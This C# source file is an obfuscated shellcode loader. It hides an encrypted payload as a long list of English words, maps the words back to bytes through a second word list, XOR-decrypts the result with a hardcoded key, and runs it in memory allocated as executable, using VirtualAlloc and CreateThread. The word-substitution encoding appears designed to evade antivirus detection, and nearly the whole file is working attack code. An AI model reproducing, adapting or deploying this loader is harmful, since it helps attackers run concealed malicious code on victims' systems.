using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace RunShellCode
{
    static class Program
    {
        private static T[] SubArray<T>(this T[] data, int index, int length)
        {
            T[] result = new T[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }

        private static byte[] xor(byte[] cipher, byte[] key)
        {
            byte[] decrypted = new byte[cipher.Length];

            for (int i = 0; i < cipher.Length; i++)
            {
                decrypted[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }

            return decrypted;
        }


        static void Main()
        {
            
            string p = "puffs knives definitions offering principal peg footing thermals berths observer knives catch publication berths drive spots strings knives truths anticipation resolution occurrence cuff berths shed knives odors yaws company occurrence cuff berths polish knives odors harbor centimeter occurrence buzzes spans sets noises prefix change guess occurrence lifetimes resident differences change glances updates reliabilities specialties formation scenes cabinet facilities drive addresses friday emergency hills apples thermals airfield welds sod honor alkalinity formation bypasses conversions change airfield accumulations communications monolith telecommunication commanders occurrence friday friday similarity similarity spare twist anticipation berths observer drydocks sod certifications lamps adherence default hardcopies others experiences scope honor occurrence seeds shortages rate sponges thermocouples prefix friday surges bails others hardcopies expiration grids addresses honor ounce spare eighths drive twist prefix change guess occurrence lifetimes resident differences airfield ornaments cabinet alkalinity mules thermals point subtotal spans entrances entry vent expenditures science scratch entries sod default bypasses harbor swamps armory shortages rate sponges chimney prefix friday surges default scenes rate accumulations airfield hazard honor restrictions noises properties drive deletions knives stalls armory cuff properties expenditures sum airfield reams addresses ohms friday count entries prefix welds knives animals publication count properties feeders offering pools knives yaws auditor bails armory scenes catch centimeter airfield stalls slice merchant gyros wave principal expiration animals lifetimes subordinates settings halves pools speeders defeats share analyses resolution prefixes expenditures scenes strings hazard military boy vent bypasses researcher scenes airfields addresses answers information entries jail stones eighths mirrors facilities airfield change ditto slice lifetimes resident knives programmers grids addresses centimeter mules spots scenes airfields sprayer yaws telephone pen jail stones merchant formation centimeter airfield result defections mules stage alkalinity berths observer drydocks sponges artillery rebounds copy spots prefix reams analyses armory publication drive copy recruits ohms clock point defections auditor military peg armory balances knives military nylon chemicals evaluations result properties desert ditto prefix change guess alkalinity radios thermals alkalinity sponges swamps yaws welds mules vacuum merchant homes cash messenger alarms anticipation occurrence anticipation apprehensions hardcopies stones shipments scope share yaws drydocks eighths desert presence airfield result deletions settings apprehensions resident principal expiration glow alarms conversions evaluations stresses berths thermals airfield book pools accumulations hardcopies chimney wave deletions surges facilities professionals certifications ornaments thermals thermals berths knives glow circumstances berths programs communications expenditures berths observer nozzle spare executions gleam thermals thermals berths halves jeopardy alarms auditor jail specialties eighths speeders thermals catch entries thermocouples boy grids gleam eighths programmers shed stage sleep messenger deductions deletions glow vent count shaft acronyms occurrence sum noises telecommunications harbor prefixes ohms pails friday hazard congress circulation answers apples change state deductions addresses stresses defeats radios knob sprayer balances presence principal prefixes executions jail noises restrictions professionals telecommunications pools grids equivalents deviation deletions cavity feeders emergency occurrence shed meters commanders equivalents equivalents reliabilities speeders thermocouples radios strip knives deductions reams chimney suggestions outfit defect share nose defect addresses pull default truths knob fares pools prefix acronyms technician change sprayer artillery evaluations commanders subtotal knob sprayer telecommunications answers mirrors inspection pull specialties speeders answers change mirrors artillery share artillery thermocouples sponges buzzes settings shortages loans subtotal cash hoofs chock builders professionals fares hoofs ounce resolution answers answers builders chief professionals loans default cash truths chock builders others defect radios ounce shed lifetimes specialties polish ounce similarity lifetimes radios pools sponges analyses speeders sprayer spots chock updates glances defeat change knob welds catch thermals harbor eliminator boy auditor homes gyros gyroscope stones programmers principal adherence fans drive subordinates participation cash stones strings defect entries eliminator nozzle harness photograph drive telecommunications twist centimeter surplus result book subtotal resident slopes professionals spokes navy recruits participation noises share voices thermocouples alkalinity addresses boy glances apprehensions share congress scope entries definitions shortages damages intervals differences sleep gyros balances ditto vent routine builders technician hardcopies slice entries slice meters feeders stalls guess researcher meters tents scope speeders change pull gleam crusts adhesives subordinates hardcopies magazine auxiliaries offering balances circulation chock photograph military resolution scratch labors knives conversions rate resolution sets bails addresses slopes eighths cavity fares updates hardcopies shaft routine company puffs defeat eighths polish inspection technician odors animals slopes subordinates labors participation expiration point communications shaft anticipation artillery outfit congress round hills buzzes voices spans programmers swamps shaft hardcopies speeders congress shipments resident chock crusts footing shortage budget radios jeopardy occurrence puffs defeats sum alarms gyroscope budget clock scenes fares merchant sets halves conversions comment reams wave centimeter surges transmitter thermocouples book ounce eighths presence certifications sets comment airfields navy race communications strings observer ticket seeds properties budget cabinet mules centimeter twist specialties fares surplus settings centimeter settings cabinet mirrors ways meters twist lifetimes voices carpet stage auditor cathode hardcopies shipments suggestions copy offering auditor bails jeopardy participation auditor military properties fasteners nylon apples drydocks entries noises suggestions copy carpet berths adhesives drydocks entries publication vacuum scenes thermals berths observer knives sessions ohms presence berths shaft principal sum airfield footing buzzes spots properties spare nozzle knives military entry chemicals bypasses desert scenes peg observer thermocouples entries subordinates settings anticipation weeks prefix apples chief student stones sessions differences odors hardcopies stones cathode chimney certifications lamps adherence sleep analyses slopes armory sod friday point plating resident technician telecommunication reams suggestions ohms occurrence strings thermals berths observer drydocks scope facilities peg facilities jail principal expiration truths mirrors truths alloy lifetimes ounce subtotal cash hoofs knob artillery fasteners lifetimes thermals animals drydocks ammonia share";
            string s = "evaluations shed fasteners lifetimes share ounce acronyms analyses speeders pull defeats resolution glances inspection strip telephone telecommunications formation loans technician updates nose scratch entrances crusts answers harbor similarity specialties alloy prefix sod vent conversions sponges airfield chemicals circulation addresses hardcopies seeds sets knives hazard noises publication animals suggestions expenditures thermals homes reams ohms strings catch scope balances yaws welds buzzes centimeter participation defect polish defeat pools prefixes adherence knob routine chimney cash commanders thermocouples builders information mirrors chock fans default programmers messenger monolith change subtotal radios fares truths hoofs sprayer artillery drive berths spots alkalinity observer others professionals outfit accumulations entries armory count reliabilities drydocks subordinates friday mules restrictions scenes copy adhesives company shortages settings occurrence properties eighths slice gyros science chief state spans sleep nozzle executions vacuum recruits stage carpet halves offering round boy auditor glow comment gyroscope presence alarms pails entry voices expiration deductions puffs principal cabinet meters equivalents grids surplus circumstances guess nylon cathode intervals ornaments facilities shipments defections feeders sum twist telecommunication deletions programs auxiliaries plating bypasses cuff spare anticipation ditto experiences communications labors race ways transmitter researcher magazine deviation pen weeks wave differences jail jeopardy hills bails ammonia sessions photograph gleam shaft book merchant peg cavity airfields harness ticket apples result surges stalls eliminator military honor odors stones desert swamps rate certifications spokes clock definitions slopes emergency lamps point resident shortage apprehensions navy budget rebounds congress footing stresses tents damages student";
            char[] raw = { (char)0, (char)1, (char)2, (char)3, (char)4, (char)5, (char)6, (char)7, (char)8, (char)9, (char)10, (char)11, (char)12, (char)14, (char)15, (char)16, (char)17, (char)18, (char)19, (char)20, (char)21, (char)22, (char)23, (char)24, (char)25, (char)26, (char)27, (char)28, (char)29, (char)31, (char)32, (char)33, (char)34, (char)35, (char)36, (char)37, (char)38, (char)39, (char)40, (char)41, (char)42, (char)43, (char)44, (char)45, (char)46, (char)47, (char)48, (char)49, (char)50, (char)51, (char)52, (char)53, (char)54, (char)55, (char)56, (char)57, (char)58, (char)59, (char)60, (char)61, (char)62, (char)63, (char)64, (char)65, (char)67, (char)68, (char)69, (char)70, (char)71, (char)72, (char)73, (char)74, (char)75, (char)77, (char)78, (char)79, (char)80, (char)82, (char)83, (char)84, (char)85, (char)86, (char)87, (char)88, (char)89, (char)90, (char)91, (char)92, (char)93, (char)94, (char)95, (char)96, (char)97, (char)98, (char)99, (char)100, (char)101, (char)102, (char)103, (char)104, (char)105, (char)106, (char)107, (char)108, (char)109, (char)110, (char)111, (char)112, (char)113, (char)114, (char)115, (char)116, (char)118, (char)119, (char)120, (char)121, (char)122, (char)123, (char)124, (char)125, (char)126, (char)127, (char)130, (char)132, (char)133, (char)134, (char)135, (char)136, (char)137, (char)138, (char)139, (char)140, (char)141, (char)142, (char)143, (char)145, (char)146, (char)147, (char)148, (char)149, (char)150, (char)151, (char)152, (char)154, (char)155, (char)156, (char)157, (char)158, (char)160, (char)161, (char)162, (char)164, (char)165, (char)166, (char)167, (char)168, (char)169, (char)170, (char)172, (char)173, (char)174, (char)175, (char)176, (char)177, (char)178, (char)179, (char)180, (char)181, (char)182, (char)183, (char)184, (char)185, (char)186, (char)187, (char)188, (char)189, (char)190, (char)191, (char)192, (char)193, (char)194, (char)195, (char)197, (char)198, (char)201, (char)202, (char)204, (char)205, (char)206, (char)207, (char)208, (char)209, (char)210, (char)211, (char)212, (char)213, (char)214, (char)215, (char)216, (char)217, (char)218, (char)219, (char)220, (char)221, (char)222, (char)224, (char)225, (char)226, (char)227, (char)228, (char)229, (char)230, (char)231, (char)232, (char)233, (char)234, (char)235, (char)236, (char)237, (char)238, (char)239, (char)240, (char)241, (char)242, (char)243, (char)244, (char)245, (char)246, (char)247, (char)248, (char)249, (char)250, (char)251, (char)253, (char)254, (char)255 };
            string[] sArray = s.Split(' ');
            string[] pArray = p.Split(' ');


            char[] ret_char = new char[pArray.Length];


            int index = 0;
            for (int i = 0; i < pArray.Length; ++i)
            {
                for (int j = 0; j < sArray.Length; ++j)
                {
                    if (pArray[i] == sArray[j])
                    {
                        ret_char[index] = raw[j];
                        index++;
                    }
                }
            }
            byte[] encryptedShellcode = new byte[ret_char.Length];

            for (int k = 0; k < ret_char.Length; k++) {

                encryptedShellcode[k] = (byte)ret_char[k];

            }



            string key = "admin123";
            byte[] shellcode = null;
            shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            // Invoke the shellcode
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        // The usual Win32 API trio functions: VirtualAlloc, CreateThread, WaitForSingleObject
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(
            UInt32 lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );
    }
}
